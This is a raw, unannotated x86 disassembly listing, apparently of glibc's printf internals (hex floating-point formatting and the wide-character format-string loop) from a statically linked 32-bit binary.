sub dword [var_114h], 4
cmp edi, eax
mov edx, dword [var_114h]
mov dword [edx], 0x30
ja 0x806b4e1
movzx eax, byte [edi]
inc edi
mov byte [var_129h], al
movzx eax, word [var_14h]
mov esi, eax
and esi, 0x7fff
jne 0x806b536
mov eax, dword [var_128h]
mov dword [var_124h], 0
test eax, eax
jne 0x806a701
mov esi, 0x4001
jmp 0x806a6f7
cmp esi, 0x4001
jle 0x806b549
sub esi, 0x4002
jmp 0x806b429
mov dword [var_124h], 1
mov eax, 0x4002
jmp 0x806b447
mov dword [var_108h_2], 0x80a0fb8
mov dword [var_10ch_2], 0x80a0fd4
jmp 0x806a297
mov ecx, 0
test ecx, ecx
je 0x806b5ab
mov dword [esp], 3
call section.
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x806a272
mov eax, dword [0x80a9ab4]
jmp 0x806b598
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.08084990
test eax, eax
je 0x806b610
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806b5e2
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b668
mov ecx, dword [var_8h]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x806b652
mov dword [var_108h_2], 0x80a0fbc
mov dword [var_10ch_2], 0x80a0fe4
lea esi, [esi]
xor eax, eax
lea edi, [var_fch]
mov ecx, 3
cld
rep stosd dword es:[edi], eax
mov edi, dword [var_14h]
mov ebx, dword [var_1ch]
mov esi, dword [var_18h]
mov dword [var_f4h], edi
mov dword [var_fch], ebx
mov dword [var_f8h], esi
mov eax, dword [var_f4h]
shr eax, 0xf
and eax, 1
mov dword [var_118h], eax
jmp 0x806a2a1
mov dword [var_108h_2], 0x80a0fc0
mov dword [var_10ch_2], 0x80a0ff4
jmp 0x806b610
mov eax, 0
test eax, eax
je 0x806b69d
mov dword [esp], 3
call section.
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x806b5ec
mov eax, dword [0x80a9ab4]
jmp 0x806b68a
mov eax, dword [ebx]
fld qword [eax]
fst qword [ebp - 0x144]
fst qword [ebp - 0x1c]
fstp qword [esp]
call fcn.08084960
test eax, eax
je 0x806b6ef
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806b6d9
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
jne 0x806a272
mov eax, 0
test eax, eax
jmp 0x806b57d
fld qword [ebp - 0x144]
fstp qword [esp]
call fcn.08084930
test eax, eax
je 0x806b744
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806b71d
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b767
mov ecx, dword [var_8h]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x806b751
mov dword [var_108h_2], 0x80a0fbc
mov dword [var_10ch_2], 0x80a0fe4
mov ebx, dword [var_18h]
mov eax, ebx
shr eax, 0x1f
jmp 0x806b647
mov dword [var_108h_2], 0x80a0fc0
mov dword [var_10ch_2], 0x80a0ff4
jmp 0x806b744
mov eax, 0
test eax, eax
je 0x806b799
mov dword [esp], 3
call section.
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x806b723
mov eax, dword [0x80a9ab4]
jmp 0x806b789
mov eax, dword [0x80a9ab4]
jmp 0x806a1e2
mov eax, dword [0x80a9ab4]
jmp 0x806a1bd
mov edx, 0
test edx, edx
je 0x806b800
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov ecx, 0
test ecx, ecx
mov eax, dword [eax + 0x2c]
mov dword [var_104h], eax
je 0x806b7f8
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0xd0]
jmp 0x806a1e8
mov eax, dword [0x80a9ab4]
jmp 0x806b7ea
nop
mov eax, dword [0x80a9ab4]
jmp 0x806b7c9
mov dword [var_ch], str.__printf_fphex
mov dword [var_8h], 0xa3
mov dword [var_4h], str..._sysdeps_generic_printf_fphex.c
mov dword [esp], str.decimal___0__decimalwc___L0
call fcn.0805efc0
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
lea eax, [var_ch]
mov dword [var_8h_2], eax
mov eax, dword [var_8h]
mov dword [var_4h_2], eax
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.08076a80
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov ebx, dword [arg_ch]
mov edi, dword [arg_8h]
mov dword [esp], 0x80a09c4
call fcn.0807ac80
mov dword [esp], 0x2e
mov dword [var_4h], eax
mov dword [var_10h], eax
call fcn.0807ad50
mov dword [var_14h], eax
mov dword [esp], 0x2c
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.0807ad50
mov edx, ebx
sub edx, edi
mov dword [var_18h], eax
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_4h], edi
mov dword [var_8h], edx
and eax, 0xfffffff0
mov edi, ebx
mov dword [var_1ch], eax
mov dword [esp], eax
call fcn.08053740
mov esi, eax
sub esi, 4
cmp esi, dword [var_1ch]
jb 0x806b93b
lea esi, [esi]
mov eax, dword [esi]
lea ebx, [eax - 0x30]
cmp ebx, 9
ja 0x806b94c
mov eax, 0
sub edi, 4
test eax, eax
je 0x806b945
mov dword [esp], 3
call section.
mov eax, dword [eax]
lea edx, [ebx + 0x33]
and edx, 0xffff
mov eax, dword [eax + edx*4 + 0x24]
sub esi, 4
mov dword [edi], eax
cmp esi, dword [var_1ch]
jae 0x806b900
lea esp, [var_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x806b922
mov edx, dword [var_10h]
test edx, edx
jne 0x806b958
sub edi, 4
jmp 0x806b931
cmp eax, 0x2e
je 0x806b962
cmp eax, 0x2c
jne 0x806b953
sub edi, 4
cmp eax, 0x2e
mov eax, dword [var_18h]
cmove eax, dword [var_14h]
jmp 0x806b931
jmp fcn.0806b980
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx]
mov ecx, dword [eax]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [ebx], edx
sub eax, 0x30
sub ecx, 0x30
cmp eax, 9
ja 0x806b9bb
mov esi, esi
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
mov eax, dword [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 4]
mov dword [ebx], eax
mov eax, dword [edx + 4]
sub eax, 0x30
cmp eax, 9
jbe 0x806b9a0
pop ebx
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1110
mov dword [var_1028h], 0
mov esi, dword [arg_ch]
call fcn.08048b20
mov edx, dword [arg_8h]
mov ebx, eax
mov eax, dword [eax]
mov dword [var_4h], 1
mov dword [esp], edx
mov dword [var_1048h], eax
call fcn.08076600
mov edx, 0xffffffff
dec eax
jne 0x806ba45
mov ecx, dword [arg_8h]
test byte [ecx], 8
jne 0x806ee3e
test esi, esi
je 0x806ee2e
mov edi, dword [arg_8h]
mov dword [var_4h], 1
mov dword [esp], edi
call fcn.08076600
mov edx, 0xffffffff
dec eax
jne 0x806ba45
test byte [edi], 2
je 0x806ba4f
mov ecx, dword [arg_10h]
mov edx, esi
mov eax, edi
call fcn.0806f370
mov edx, eax
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_10h]
mov dword [var_102ch], 0xffffffff
mov dword [var_1044h], 0
mov dword [esp], esi
mov dword [var_1040h], eax
call fcn.08074b00
mov ecx, dword [arg_8h]
mov dword [var_1034h], eax
mov dword [var_ff4h], eax
mov dword [var_104ch], 0
movzx edx, word [ecx]
test dx, dx
js 0x806bac8
mov eax, 0
test eax, eax
je 0x806bac8
lea eax, [var_fbch]
mov dword [var_104ch], 1
mov dword [var_8h], ecx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
mov edi, dword [arg_8h]
movzx edx, word [edi]
test dx, dx
jns 0x806ee1e
mov edx, dword [arg_8h]
mov ebx, dword [var_1034h]
mov eax, dword [edx + 0x94]
sub ebx, esi
mov dword [esp], edx
sar ebx, 2
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
mov dword [var_1030h], 0xffffffff
cmp eax, ebx
je 0x806bb41
mov edx, dword [arg_8h]
cmp word [edx], 0
jns 0x806bb37
mov ecx, dword [var_104ch]
test ecx, ecx
jne 0x806bb1f
mov edx, dword [var_1030h]
jmp 0x806ba45
lea eax, [var_fbch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x806bb14
mov dword [esp], edx
call fcn.08074580
jmp 0x806bb0a
mov dword [var_1030h], eax
mov eax, dword [var_ff4h]
mov eax, dword [eax]
test eax, eax
je 0x806bb01
mov eax, dword [var_ff4h]
lea ecx, [var_ch]
mov dword [var_1060h], 0
mov dword [var_1064h], 0
mov dword [var_1068h], 0
mov dword [var_106ch], 0
mov dword [var_1070h], 0
mov dword [var_1074h], 0
mov dword [var_1078h], 0
lea edx, [eax + 4]
mov dword [var_107ch], 0
mov dword [var_1080h], 0
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov dword [var_1084h], 0
mov dword [var_1088h], 0xffffffff
mov dword [var_108ch], 0
mov dword [var_1090h], 0x20
mov dword [var_1038h], 0
mov dword [var_103ch], ecx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1200]
jmp edx
mov dword [var_1064h], 1
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
jmp 0x806bc1a
mov eax, dword [var_ff4h]
mov dword [var_106ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
mov eax, dword [edx*4 + 0x80a1000]
jmp 0x806bc1a
mov dword [var_1068h], 1
mov dword [var_1090h], 0x20
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov ecx, dword [var_1094h]
mov eax, dword [ecx*4 + 0x80a1000]
jmp 0x806bc1a
mov dword [var_1060h], 1
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
jmp 0x806bc0d
mov eax, dword [var_1068h]
test eax, eax
mov eax, 0x30
cmovne eax, dword [var_1090h]
mov dword [var_1090h], eax
jmp 0x806bc2d
cmp dword [var_102ch], 0xffffffff
mov dword [var_1070h], 1
jne 0x806bcb6
mov ebx, 0
test ebx, ebx
je 0x806bdcb
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x34]
mov dword [var_1028h], eax
je 0x806bdc4
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_102ch], eax
movzx eax, byte [eax]
test al, al
je 0x806bdb5
cmp al, 0x7f
je 0x806bdb5
mov eax, dword [var_1028h]
test eax, eax
jne 0x806bcb6
mov dword [var_102ch], 0
jmp 0x806bcb6
mov eax, dword [0x80a9ab4]
jmp 0x806bd90
mov eax, dword [0x80a9ab4]
jmp 0x806bd74
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov dword [var_ff0h], edx
sub eax, 0x30
cmp eax, 9
jbe 0x806edf4
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_1084h], eax
js 0x806edd3
mov eax, dword [var_1084h]
add eax, 0x20
cmp eax, 0x3e7
jle 0x806be54
mov ebx, dword [var_1084h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ed9b
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [var_10f9h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov edx, case.0x806bc21.32
mov eax, dword [eax]
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1280]
jmp edx
mov edx, dword [0x80aad28]
xor edi, edi
test edx, edx
je 0x806beae
mov ecx, dword [var_1044h]
mov esi, dword [var_10a0h]
lea eax, [ecx + ecx*2]
shl eax, 4
mov eax, dword [esi + eax + 8]
mov edi, dword [edx + eax*4]
test edi, edi
mov eax, fcn.0806ee50
mov edx, dword [var_10a0h]
cmove edi, eax
mov eax, dword [var_1044h]
lea esi, [eax + eax*2]
shl esi, 4
mov ebx, dword [edx + esi + 0x2c]
xor edx, edx
lea eax, [ebx*4 + 0x10]
sub esp, eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
cmp edx, ebx
jae 0x806bf0b
mov eax, dword [var_10a0h]
mov esi, dword [eax + esi + 0x24]
lea eax, [esi + esi*2]
mov esi, dword [var_10a8h]
lea eax, [esi + eax*4]
lea esi, [esi]
mov dword [ecx + edx*4], eax
add eax, 0xc
inc edx
cmp edx, ebx
jb 0x806bf00
mov edx, dword [var_1044h]
mov dword [var_8h_2], ecx
mov ecx, dword [arg_8h]
lea eax, [edx + edx*2]
mov dword [esp], ecx
shl eax, 4
add eax, dword [var_10a0h]
mov dword [var_4h_2], eax
call edi
test eax, eax
js 0x806c5e3
add dword [var_1030h], eax
mov esi, dword [var_1104h]
test esi, esi
jne 0x806ed88
mov eax, dword [var_1044h]
mov ecx, dword [var_10a0h]
mov edi, dword [arg_8h]
lea ebx, [eax + eax*2]
shl ebx, 4
mov edx, dword [edi + 0x94]
mov eax, dword [ecx + ebx + 0x18]
sub eax, dword [ecx + ebx + 0x14]
sar eax, 2
mov dword [var_8h_2], eax
mov eax, dword [ecx + ebx + 0x14]
mov dword [esp], edi
mov dword [var_4h_2], eax
call dword [edx + 0x1c]
mov esi, dword [var_10a0h]
mov edx, eax
mov eax, dword [esi + ebx + 0x18]
sub eax, dword [esi + ebx + 0x14]
sar eax, 2
cmp edx, eax
jne 0x806c5e3
inc dword [var_1044h]
add dword [var_1030h], edx
mov edi, dword [var_1098h]
cmp dword [var_1044h], edi
jae 0x806c5ed
mov edx, dword [var_1044h]
mov esi, dword [var_10a0h]
mov dword [var_1104h], 0
lea ecx, [edx + edx*2]
shl ecx, 4
movzx ebx, byte [esi + ecx + 0xc]
mov eax, ebx
shr al, 3
mov edi, eax
mov eax, ebx
shr al, 4
and edi, 1
mov edx, eax
mov dword [var_10cch], edi
mov eax, ebx
shr al, 5
and edx, 1
mov esi, eax
mov dword [var_10d0h], edx
mov eax, ebx
shr al, 6
and esi, 1
mov edi, eax
mov dword [var_10d4h], esi
mov eax, ebx
shr al, 7
mov esi, dword [var_10a0h]
and edi, 1
movzx eax, al
mov dword [var_10d8h], edi
mov dword [var_10dch], eax
mov eax, ebx
and eax, 1
mov dword [var_10e0h], eax
mov eax, ebx
shr al, 1
mov edx, eax
mov eax, ebx
and edx, 1
shr al, 2
mov dword [var_10e4h], edx
movzx edx, byte [esi + ecx + 0xd]
mov esi, eax
mov eax, dword [var_10a0h]
and esi, 1
mov dword [var_10ech], esi
mov eax, dword [eax + ecx]
shr dl, 1
mov edi, edx
shr dl, 2
mov esi, edx
and edi, 1
mov edx, dword [var_10a0h]
mov dword [var_10f4h], eax
and esi, 1
mov dword [var_10e8h], edi
mov eax, dword [var_10a0h]
mov dword [var_10f8h], esi
mov edi, dword [var_10a0h]
mov esi, dword [var_10a0h]
mov edx, dword [edx + ecx + 8]
movzx eax, byte [eax + ecx + 0x10]
mov edi, dword [edi + ecx + 4]
mov dword [var_1100h], edx
mov dword [var_10f0h], edi
mov byte [var_10f9h], al
mov eax, dword [esi + ecx + 0x20]
cmp eax, 0xffffffff
je 0x806c0f0
mov edi, dword [var_10a8h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + ecx + 4], eax
js 0x806ed6c
mov eax, dword [var_10a0h]
mov ecx, dword [eax + ecx + 4]
mov dword [var_10f0h], ecx
mov ecx, dword [var_1044h]
mov esi, dword [var_10a0h]
lea edx, [ecx + ecx*2]
shl edx, 4
mov eax, dword [esi + edx + 0x1c]
cmp eax, 0xffffffff
je 0x806c131
mov edi, dword [var_10a8h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + edx], eax
js 0x806ed60
mov eax, dword [var_10a0h]
mov edx, dword [eax + edx]
mov dword [var_10f4h], edx
mov edx, dword [var_10f4h]
cmp dword [var_10f0h], edx
mov eax, edx
cmovge eax, dword [var_10f0h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806c1b2
cmp dword [var_10f0h], edx
mov eax, edx
cmovge eax, dword [var_10f0h]
lea eax, [eax*4 + 0x80]
cmp eax, 0x1000
ja 0x806ed01
mov ecx, dword [var_10f4h]
cmp dword [var_10f0h], ecx
mov eax, ecx
cmovge eax, dword [var_10f0h]
lea eax, [eax*4 + 0x90]
sub esp, eax
mov eax, ecx
lea edx, [var_23h]
and edx, 0xfffffff0
cmp dword [var_10f0h], ecx
cmovge eax, dword [var_10f0h]
lea eax, [edx + eax*4 + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_1100h]
mov edx, case.0x806c1dd.32
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1100h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1500]
jmp edx
mov eax, dword [var_1094h]
test eax, eax
je 0x806c5e3
sub esp, 0x610
mov dword [var_1098h], 0
mov dword [var_109ch], 0x20
lea edi, [var_23h]
mov dword [var_10a4h], 0
mov dword [var_1010h], 0
and edi, 0xfffffff0
cmp dword [var_102ch], 0xffffffff
mov dword [var_10a0h], edi
je 0x806c57a
mov edx, dword [var_1034h]
mov eax, dword [edx]
mov dword [var_ff4h], edx
test eax, eax
je 0x806c36c
mov ecx, dword [var_1098h]
lea ecx, [ecx + ecx*2]
shl ecx, 4
mov dword [var_1108h], ecx
lea esi, [esi]
mov esi, dword [var_109ch]
cmp dword [var_1098h], esi
jb 0x806c30f
mov ebx, esi
mov edi, dword [var_10a0h]
add ebx, ebx
lea eax, [ebx + ebx*2]
mov dword [var_109ch], ebx
shl eax, 4
mov dword [var_10ach], edi
add eax, 0x10
sub esp, eax
lea eax, [var_23h]
and eax, 0xfffffff0
mov dword [var_10a0h], eax
mov eax, edi
add eax, dword [var_1108h]
cmp dword [var_10a0h], eax
je 0x806c569
mov ecx, dword [var_1108h]
mov edi, dword [var_10a0h]
cld
mov esi, dword [var_10ach]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
test byte [var_1108h], 2
mov edx, edi
je 0x806c2e3
movzx eax, word [esi]
add edx, 2
add esi, 2
mov word [edi], ax
test byte [var_1108h], 1
je 0x806c2f1
movzx eax, byte [esi]
mov byte [edx], al
mov eax, dword [var_10a0h]
add eax, dword [var_1108h]
cmp dword [var_10ach], eax
je 0x806c558
mov edx, dword [var_ff4h]
lea eax, [var_1010h]
mov ebx, dword [var_1108h]
mov ecx, dword [var_10a4h]
mov dword [var_sp_ch], eax
mov dword [esp], edx
mov eax, dword [var_10a0h]
mov dword [var_4h_2], ecx
add eax, ebx
mov dword [var_8h_2], eax
call fcn.08074b20
mov esi, dword [var_10a0h]
add dword [var_10a4h], eax
inc dword [var_1098h]
add dword [var_1108h], 0x30
mov eax, dword [esi + ebx + 0x18]
mov dword [var_ff4h], eax
mov edx, eax
mov eax, dword [eax]
test eax, eax
jne 0x806c260
mov edi, dword [var_1010h]
mov eax, dword [var_10a4h]
cld
cmp edi, eax
cmovae eax, edi
mov ecx, eax
mov dword [var_10b0h], eax
shl ecx, 2
lea eax, [ecx + 0x10]
shr ecx, 2
sub esp, eax
xor eax, eax
lea edx, [var_23h]
and edx, 0xfffffff0
mov edi, edx
mov dword [var_10b4h], edx
rep stosd dword es:[edi], eax
mov ecx, dword [var_10b0h]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x10]
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_10b8h], esi
mov dword [var_10a8h], esi
xor esi, esi
cmp esi, dword [var_1098h]
jae 0x806c452
mov ebx, dword [var_10a0h]
xor edi, edi
add ebx, 0x2c
mov esi, esi
mov eax, dword [ebx - 0xc]
cmp eax, 0xffffffff
je 0x806c3f5
mov edx, dword [var_10b4h]
mov dword [edx + eax*4], 0
mov eax, dword [ebx - 0x10]
cmp eax, 0xffffffff
je 0x806c40a
mov ecx, dword [var_10b4h]
mov dword [ecx + eax*4], 0
mov eax, dword [ebx]
test eax, eax
je 0x806c443
dec eax
je 0x806c544
mov eax, dword [ebx - 8]
mov ecx, dword [var_10b4h]
mov edx, dword [ebx - 0x24]
lea eax, [ecx + eax*4]
mov dword [var_8h_2], eax
mov eax, dword [ebx]
mov dword [var_4h_2], eax
mov eax, dword [var_10a0h]
add eax, edi
mov dword [esp], eax
mov eax, dword [0x80aad94]
call dword [eax + edx*4]
inc esi
add edi, 0x30
add ebx, 0x30
cmp esi, dword [var_1098h]
jb 0x806c3e0
xor esi, esi
cmp esi, dword [var_10b0h]
jae 0x806c4a4
mov ebx, dword [var_10b8h]
mov edi, dword [var_10b4h]
mov eax, dword [edi + esi*4]
cmp eax, 5
je 0x806c487
jg 0x806c4cf
cmp eax, 2
je 0x806c487
jg 0x806c4c5
test eax, eax
je 0x806c487
cmp eax, 1
je 0x806c487
test ah, 8
je 0x806c4b5
mov eax, dword [var_1040h]
add dword [var_1040h], 4
mov eax, dword [eax]
mov dword [ebx], eax
inc esi
add ebx, 0xc
cmp esi, dword [var_10b0h]
jb 0x806c462
mov eax, dword [var_1098h]
cmp dword [var_1044h], eax
jmp 0x806bfb4
xor eax, eax
xor edx, edx
xor ecx, ecx
mov dword [ebx], eax
mov dword [ebx + 4], edx
mov dword [ebx + 8], ecx
jmp 0x806c498
cmp eax, 3
je 0x806c487
cmp eax, 4
jmp 0x806c480
cmp eax, 0x100
je 0x806c52a
jg 0x806c4f5
cmp eax, 6
je 0x806c4e2
cmp eax, 7
jne 0x806c482
mov eax, dword [var_1040h]
add dword [var_1040h], 8
fld qword [eax]
fstp qword [ebx]
jmp 0x806c498
cmp eax, 0x200
je 0x806c487
jg 0x806c520
cmp eax, 0x107
jne 0x806c482
mov eax, dword [var_1040h]
add dword [var_1040h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
jmp 0x806c4bb
cmp eax, 0x400
jmp 0x806c480
mov eax, dword [var_1040h]
add dword [var_1040h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [ebx + 4], edx
jmp 0x806c496
mov edx, dword [ebx - 8]
mov eax, dword [ebx - 4]
mov ecx, dword [var_10b4h]
mov dword [ecx + edx*4], eax
jmp 0x806c443
mov eax, ebx
shr eax, 1
add ebx, eax
mov dword [var_109ch], ebx
jmp 0x806c309
mov eax, ebx
shr eax, 1
add ebx, eax
mov dword [var_109ch], ebx
jmp 0x806c30f
mov ebx, 0
test ebx, ebx
je 0x806c5dc
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x34]
mov dword [var_1028h], eax
je 0x806c5d5
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_102ch], eax
movzx eax, byte [eax]
test al, al
je 0x806c5c6
cmp al, 0x7f
jne 0x806c235
mov dword [var_102ch], 0
jmp 0x806c235
mov eax, dword [0x80a9ab4]
jmp 0x806c5ab
mov eax, dword [0x80a9ab4]
jmp 0x806c58f
mov dword [var_1030h], 0xffffffff
mov ebx, dword [var_1038h]
test ebx, ebx
je 0x806bb01
mov eax, dword [var_1038h]
mov dword [esp], eax
call fcn.08051180
jmp 0x806bb01
mov edx, dword [var_1044h]
lea eax, [edx + edx*2]
mov edx, dword [var_10a0h]
shl eax, 4
add edx, eax
jne 0x806c762
lea ebx, [var_fech]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_10f4h]
mov esi, dword [var_1100h]
rep stosd dword es:[edi], eax
mov ecx, dword [var_10f0h]
movzx eax, byte [var_10e4h]
mov dword [var_fech], edx
mov dword [var_fe4h], esi
mov dword [var_fe8h], ecx
movzx ecx, byte [var_10e0h]
and eax, 1
add eax, eax
and ecx, 1
movzx edx, byte [var_fe0h]
or byte [var_fdfh], 4
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_10ech]
or edx, eax
movzx eax, byte [var_10cch]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_10d0h]
or edx, eax
movzx eax, byte [var_10d4h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_10dch]
or edx, eax
movzx eax, byte [var_10d8h]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movsx eax, byte [var_10f9h]
or edx, ecx
mov ecx, dword [var_10e0h]
mov byte [var_fe0h], dl
test ecx, ecx
mov dword [var_fdch], eax
je 0x806c751
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
lea eax, [var_fcch]
mov dword [var_4h_2], ebx
mov dword [var_1018h], eax
lea eax, [var_1018h]
mov dword [var_8h_2], eax
mov edi, dword [arg_8h]
mov dword [esp], edi
call fcn.0806a140
jmp 0x806bf2d
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806c727
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + eax + 0x24]
mov dword [var_4h_2], edx
lea eax, [eax + eax*2]
lea eax, [esi + eax*4]
jmp 0x806c731
mov edx, dword [var_10d4h]
dec dword [var_10f0h]
test edx, edx
jne 0x806c7bb
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806c7bb
mov ecx, dword [var_10f0h]
mov esi, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], esi
call fcn.08075900
add dword [var_1030h], eax
mov edi, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806c84f
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806c83d
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
mov ebx, dword [var_10d4h]
inc dword [var_1030h]
test ebx, ebx
je 0x806bf3b
mov ecx, dword [var_10f0h]
test ecx, ecx
jle 0x806bf3b
mov eax, dword [var_10f0h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], eax
mov dword [esp], edx
call fcn.08075900
jmp 0x806bf35
mov edx, dword [arg_8h]
mov dword [var_4h_2], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806c7f3
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov ecx, dword [esi + eax*4]
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jb 0x806c7ea
mov dword [var_4h_2], ecx
mov dword [esp], edi
jmp 0x806c847
